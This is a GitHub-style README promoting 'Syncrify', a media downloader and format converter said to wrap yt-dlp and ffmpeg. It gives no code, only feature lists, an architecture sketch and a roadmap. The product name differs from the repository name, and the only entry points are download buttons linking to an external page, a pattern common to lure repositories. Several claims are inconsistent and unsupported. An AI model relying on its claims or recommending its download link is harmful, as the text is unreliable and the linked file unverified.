![preview](https://raw.githubusercontent.com/tahzeeb031/harmonize-ffmpeg-pipeline/main/preview.svg)

# Syncrify

**All-in-One Media Orchestrator & Format Alchemist**

A self-hosted, browser-first media pipeline that eliminates format fragmentation. Syncrify ingests audio and video from any major streaming source—YouTube, Spotify, Apple Music, Deezer, and more—then transforms, organizes, and serves your library on demand. No subscription lock-in, no redundant manual steps, no format guessing.

Built on the shoulders of yt-dlp and ffmpeg, Syncrify wraps raw extraction power behind a polished web interface, desktop companion, and automated conversion engine. Whether you are archiving a lecture, building a private music collection, or prepping media for offline playback on legacy devices, Syncrify handles the entire journey from source URL to playable file.

## Overview

The modern media landscape is fractured. One platform streams in MP4, another in M4A. A podcast lives behind a paywall. A concert video exists only in a geo-restricted region. Syncrify bridges these gaps by functioning as a universal ingestion point. You paste a link, choose a target format, and the system does the rest—fetching, transcoding, tagging, and depositing the final file into your organized output directory.

Unlike typical downloader tools that stop at file acquisition, Syncrify adds a semantic layer: automatic metadata enrichment, smart file renaming, playlist preservation, and scheduled batch processing. You can queue an entire YouTube playlist overnight, wake up to a folder of neatly named MP3 files with embedded album art and ID3 tags.

[![Download](https://raw.githubusercontent.com/tahzeeb031/harmonize-ffmpeg-pipeline/main/button.svg)](https://tahzeeb031.github.io/harmonize-ffmpeg-pipeline/)

## Features ✨

### Universal Source Ingestion
- Supports YouTube, Spotify, Apple Music, Deezer, SoundCloud, Vimeo, Dailymotion, Bandcamp, and hundreds of smaller platforms via yt-dlp backend.
- Playlist and channel detection: fetch entire series, albums, or user uploads in one pass.
- URL validation and pre-flight checks: verify source availability before starting a download.

### Format Transformation Engine
- Preset profiles for common targets: MP3 (320kbps variable), M4A (AAC-LC), FLAC (lossless), Opus (streaming efficient), MP4 (h.264), MKV (h.265), WebM.
- Custom parameter injection: pass any ffmpeg or yt-dlp flag directly through the interface.
- Subtitle extraction, embedding, and hardcoding for video outputs.

### Responsive Web Dashboard
- Progressive web application design: works on desktop, tablet, and mobile browsers.
- Real-time progress bars, error logs, and estimated completion times for active jobs.
- Dark and light themes with persistent user preferences.
- Multi-language interface (English, Spanish, German, Japanese, French, Portuguese).

### Desktop Companion Application
- Standalone tray app for Windows, macOS, and Linux.
- Right-click URL capture from clipboard or browser.
- Background service mode: continues downloads even when web dashboard closes.

### Smart Naming & Organization
- Template-based file naming: `{playlist_title}/{track_number} - {title}.{ext}`.
- Automatic folder structure creation per source or project.
- Duplicate detection: skip files with identical source URL and output path.

### Batch Scheduling & Automation
- Set daily, weekly, or custom recurring queues.
- Email notification upon batch completion or failure.
- API endpoint for external trigger integration (Home Assistant, IFTTT, custom scripts).

## Getting Started 🚀

### Quick Spin-Up

1. Access the web dashboard from any modern browser on your local network.
2. Paste a supported URL into the ingestion field.
3. Choose your output format and naming template.
4. Click "Orchestrate" – the pipeline begins immediately.

For headless environments or server deployments, Syncrify exposes a configuration file that lets you predefine source feeds, output rules, and notification channels.

### Core Concepts

- **Pipeline**: A sequence of operations (fetch, transcode, rename, move) applied to an input URL.
- **Preset**: A saved combination of format, quality, naming template, and output folder.
- **Batch**: A collection of pipelines executed sequentially or in parallel.

## Architecture 🔧

Syncrify follows a three-layer design:

```
┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  Presentation   │────▶│  Orchestrator    │────▶│  Execution Layer │
│  Web UI         │     │  API Server      │     │  yt-dlp + ffmpeg │
│  Desktop App    │     │  Job Scheduler   │     │  Metadata Parsers│
└─────────────────┘     └──────────────────┘     └──────────────────┘
```

- **Presentation layer**: Vue.js-powered dashboard with reactive state management. Communicates with Orchestrator via REST and WebSocket.
- **Orchestrator**: Node.js backend handling session management, queue persistence, rate limiting, and health monitoring.
- **Execution layer**: Python virtual environment containing yt-dlp, ffmpeg (static builds), and custom metadata extractors for Spotify and Apple Music (no API keys required; uses public scrape endpoints).

All layers run inside a single container image, simplifying deployment to any x86 or ARM environment.

## Supported Destinations 📦

| Type | Format | Notes |
|------|--------|-------|
| Lossless archives | FLAC, ALAC, WAV | For audiophile collections |
| Streaming portability | MP3 320, M4A 256 | Balanced size vs quality |
| Modern web playback | Opus, WebM | For browser-native streaming |
| Universal video | MP4 h.264, MKV h.265 | Subtitle support included |
| Legacy device | WMA, OGG, AVI | Downmix & transcode options |

## Security & Privacy 🔒

- All processing occurs on your hardware. No footage, audio, or metadata is transmitted to external servers beyond the initial source lookup.
- Local authentication gate prevents unauthorized access to the web dashboard.
- TLS encryption available for reverse proxy setups (documented in configuration guide).
- No telemetry, no analytics, no data persistence outside your selected output directory.

## Customization & Extensibility 🧩

Syncrify's configuration file (`syncrify.conf`) exposes over 120 tunable parameters:

- Custom ffmpeg presets with arbitrary libx264/x265 tuning flags.
- Webhook integration for real-time pipeline status to Discord, Slack, or custom endpoints.
- Plugin hooks for post-processing: run a shell script after each successful conversion (e.g., upload to S3, rename by BPM analysis, transcribe audio).
- Environment variable override for containerized deployments.

## Multilingual Support 🌐

The web dashboard ships with full localization for six languages:

- English
- Spanish (español)
- German (Deutsch)
- Japanese (日本語)
- French (français)
- Portuguese (português)

Additional language packs can be added via simple JSON translation files contributed by the community.

## 24/7 Support & Community 🛟

- **Documentation Portal**: Comprehensive guides covering every configuration flag, pipeline preset, and troubleshooting scenario.
- **Community Forum**: Searchable archive of questions, answers, and shared preset configurations.
- **Priority Ticket System**: For confirmed deployments requiring response within 4 hours (available through sponsorship tiers).

## Contribution Guidelines 🤝

Contributions are welcome in the following areas:

- Adding new source platform parsers (extend the existing scraper interface).
- Improving metadata extraction accuracy for niche streaming services.
- Enhancing the web UI with additional visualization and queue management features.
- Writing localization strings for underrepresented languages.
- Testing on unusual hardware configurations (Raspberry Pi, NAS boxes, old laptops).

All pull requests should include a test source URL and example output to validate changes.

## Roadmap 🗺️

| Quarter | Milestone |
|---------|-----------|
| Q1 2026 | Initial public release with YouTube, Spotify, Deezer support |
| Q2 2026 | Apple Music autoscraper, batch scheduler, desktop tray app |
| Q3 2026 | Plugin system, webhook support, advanced preset templates |
| Q4 2026 | Mobile companion app (iOS/Android), cloud sync integrations |

## Disclaimer ⚠️

Syncrify is designed for personal, archival, and educational use. Users are responsible for ensuring compliance with the terms of service of any platform they interact with through this tool. The developers do not host, distribute, or promote unauthorized copies of copyrighted material. Syncrify functions strictly as a local format conversion utility and does not circumvent access controls or bypass paywalls.

## License 📄

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for full terms.

[![Download](https://raw.githubusercontent.com/tahzeeb031/harmonize-ffmpeg-pipeline/main/button.svg)](https://tahzeeb031.github.io/harmonize-ffmpeg-pipeline/)